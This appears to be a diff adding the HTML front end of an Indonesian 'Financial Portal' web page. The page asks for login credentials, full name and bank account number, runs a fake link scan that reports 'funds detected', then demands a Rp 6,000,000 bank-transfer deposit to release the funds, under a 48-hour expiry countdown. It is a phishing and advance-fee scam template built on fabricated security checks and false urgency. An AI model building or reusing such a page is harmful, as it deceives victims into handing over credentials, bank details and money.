@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Financial System</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+<body>
+    <!-- Animated Background Particles -->
+    <div class="particles" id="particles"></div>
+    
+    <!-- Glow Effects -->
+    <div class="glow glow-1"></div>
+    <div class="glow glow-2"></div>
+    <div class="glow glow-3"></div>
+
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Logo / Brand -->
+        <div class="brand" id="brand">
+            <div class="brand-icon">
+                <i class="fas fa-shield-halved"></i>
+            </div>
+            <h1>FINANCIAL<span>PORTAL</span></h1>
+            <p class="brand-sub">Secure Digital Financial Platform</p>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-container" id="progressContainer" style="display:none;">
+            <div class="progress-steps">
+                <div class="step active" data-step="1"><span>1</span></div>
+                <div class="step-line"></div>
+                <div class="step" data-step="2"><span>2</span></div>
+                <div class="step-line"></div>
+                <div class="step" data-step="3"><span>3</span></div>
+                <div class="step-line"></div>
+                <div class="step" data-step="4"><span>4</span></div>
+            </div>
+        </div>
+
+        <!-- Step 1: Login -->
+        <div class="card" id="step1">
+            <div class="card-header">
+                <div class="card-icon"><i class="fas fa-lock"></i></div>
+                <h2>Selamat Datang</h2>
+                <p>Masuk ke akun Anda untuk melanjutkan</p>
+            </div>
+            <form id="loginForm" class="form">
+                <div class="input-group">
+                    <div class="input-icon"><i class="fas fa-user"></i></div>
+                    <input type="text" id="username" placeholder="Username" required autocomplete="off">
+                    <label>Username</label>
+                </div>
+                <div class="input-group">
+                    <div class="input-icon"><i class="fas fa-key"></i></div>
+                    <input type="password" id="password" placeholder="Password" required>
+                    <label>Password</label>
+                    <button type="button" class="toggle-pass" onclick="togglePassword()">
+                        <i class="fas fa-eye" id="eyeIcon"></i>
+                    </button>
+                </div>
+                <button type="submit" class="btn-primary">
+                    <span>Masuk</span>
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </form>
+        </div>
+
+        <!-- Step 2: Data Input -->
+        <div class="card" id="step2" style="display:none;">
+            <div class="card-header">
+                <div class="card-icon"><i class="fas fa-user-edit"></i></div>
+                <h2>Data Diri</h2>
+                <p>Lengkapi informasi Anda</p>
+            </div>
+            <form id="dataForm" class="form">
+                <div class="input-group">
+                    <div class="input-icon"><i class="fas fa-id-card"></i></div>
+                    <input type="text" id="nama" placeholder="Nama Lengkap" required autocomplete="off">
+                    <label>Nama Lengkap</label>
+                </div>
+                <div class="input-group">
+                    <div class="input-icon"><i class="fas fa-building-columns"></i></div>
+                    <input type="text" id="norekening" placeholder="Nomor Rekening" required autocomplete="off">
+                    <label>Nomor Rekening</label>
+                </div>
+                <div class="input-group">
+                    <div class="input-icon"><i class="fas fa-briefcase"></i></div>
+                    <input type="text" id="job" placeholder="Pekerjaan yang Diinginkan" required autocomplete="off">
+                    <label>Pekerjaan yang Diinginkan</label>
+                </div>
+                <button type="submit" class="btn-primary">
+                    <span>Lanjutkan</span>
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </form>
+        </div>
+
+        <!-- Step 3: Link Input -->
+        <div class="card" id="step3" style="display:none;">
+            <div class="card-header">
+                <div class="card-icon"><i class="fas fa-link"></i></div>
+                <h2>Input Link</h2>
+                <p>Masukkan link untuk di-scan</p>
+            </div>
+            <form id="linkForm" class="form">
+                <div class="input-group">
+                    <div class="input-icon"><i class="fas fa-globe"></i></div>
+                    <input type="url" id="linkInput" placeholder="https://example.com" required autocomplete="off">
+                    <label>Masukkan Link</label>
+                </div>
+                <button type="submit" class="btn-primary">
+                    <span>Scan Link</span>
+                    <i class="fas fa-search"></i>
+                </button>
+            </form>
+
+            <!-- Scanning Animation -->
+            <div class="scan-container" id="scanContainer" style="display:none;">
+                <div class="scan-ring">
+                    <div class="scan-ring-inner"></div>
+                    <i class="fas fa-radar scan-icon"></i>
+                </div>
+                <div class="scan-text">
+                    <p class="scan-status">Scanning Link...</p>
+                    <div class="scan-progress-bar">
+                        <div class="scan-progress-fill" id="scanFill"></div>
+                    </div>
+                    <p class="scan-detail" id="scanDetail">Menganalisis keamanan link...</p>
+                </div>
+                <div class="scan-results" id="scanResults" style="display:none;">
+                    <div class="scan-result-item success">
+                        <i class="fas fa-check-circle"></i>
+                        <span>SSL Certificate Valid</span>
+                    </div>
+                    <div class="scan-result-item success">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Connection Secure</span>
+                    </div>
+                    <div class="scan-result-item success">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Data Verified</span>
+                    </div>
+                    <div class="scan-result-item warning">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>Fund Detected - Ready to Process</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 4: Result + Cairkan -->
+        <div class="card" id="step4" style="display:none;">
+            <div class="card-header">
+                <div class="card-icon success-icon"><i class="fas fa-check-double"></i></div>
+                <h2>Dana Ditemukan!</h2>
+                <p>Link berhasil di-scan dan dana terdeteksi</p>
+            </div>
+
+            <div class="fund-display">
+                <div class="fund-label">Total Dana Tersedia</div>
+                <div class="fund-amount" id="fundAmount">
+                    <span class="currency">Rp</span>
+                    <span class="amount" id="amountValue">0</span>
+                </div>
+                <div class="fund-status">
+                    <div class="status-dot active"></div>
+                    <span>Tersedia untuk Pencairan</span>
+                </div>
+            </div>
+
+            <div class="fund-details">
+                <div class="detail-row">
+                    <span><i class="fas fa-calendar"></i> Tanggal</span>
+                    <span id="currentDate">-</span>
+                </div>
+                <div class="detail-row">
+                    <span><i class="fas fa-hashtag"></i> Ref ID</span>
+                    <span id="refId">-</span>
+                </div>
+                <div class="detail-row">
+                    <span><i class="fas fa-shield"></i> Status</span>
+                    <span class="status-verified"><i class="fas fa-check"></i> Verified</span>
+                </div>
+            </div>
+
+            <button class="btn-primary btn-cairkan" id="btnCairkan" onclick="showWarning()">
+                <span>Cairkan Dana</span>
+                <i class="fas fa-money-bill-wave"></i>
+            </button>
+        </div>
+
+        <!-- Step 5: Warning -->
+        <div class="card" id="step5" style="display:none;">
+            <div class="card-header warning-header">
+                <div class="card-icon warning-icon pulse-warning"><i class="fas fa-exclamation-triangle"></i></div>
+                <h2>PERHATIAN!</h2>
+                <p>Proses Pencairan Dana</p>
+            </div>
+
+            <div class="warning-box">
+                <div class="warning-icon-big">
+                    <i class="fas fa-shield-halved"></i>
+                </div>
+                <div class="warning-content">
+                    <p class="warning-text">Proses akan dilanjut jika deposit terlebih dahulu nominal <strong>Rp 6.000.000</strong> untuk melanjutkan proses pencairan, proses <strong>1-5 hari</strong>.</p>
+                    <div class="warning-note">
+                        <i class="fas fa-info-circle"></i>
+                        <p><strong>Note:</strong> Dana dikembalikan otomatis transfer ke rekening yang terdaftar, tools berjalan <strong>2 hari sebelum hangus</strong>.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="deposit-info">
+                <div class="deposit-amount">
+                    <span>Nominal Deposit</span>
+                    <strong>Rp 6.000.000</strong>
+                </div>
+                <div class="deposit-method">
+                    <span>Metode</span>
+                    <strong>Transfer Bank</strong>
+                </div>
+                <div class="deposit-eta">
+                    <span>Estimasi Proses</span>
+                    <strong>1-5 Hari Kerja</strong>
+                </div>
+            </div>
+
+            <div class="warning-actions">
+                <button class="btn-primary btn-deposit" onclick="processDeposit()">
+                    <span>Deposit & Proses</span>
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+                <button class="btn-secondary" onclick="cancelProcess()">
+                    <span>Batalkan</span>
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+
+            <div class="timer-bar" id="timerBar">
+                <div class="timer-label">
+                    <i class="fas fa-clock"></i>
+                    <span>Waktu tersisa sebelum hangus: <strong id="timerDisplay">48:00:00</strong></span>
+                </div>
+                <div class="timer-progress">
+                    <div class="timer-fill" id="timerFill"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success Modal -->
+        <div class="modal-overlay" id="successModal" style="display:none;">
+            <div class="modal">
+                <div class="modal-icon"><i class="fas fa-check-circle"></i></div>
+                <h3>Data Terkirim!</h3>
+                <p>Informasi Anda telah berhasil dikirim ke sistem.</p>
+                <button class="btn-primary" onclick="closeModal()">
+                    <span>OK</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
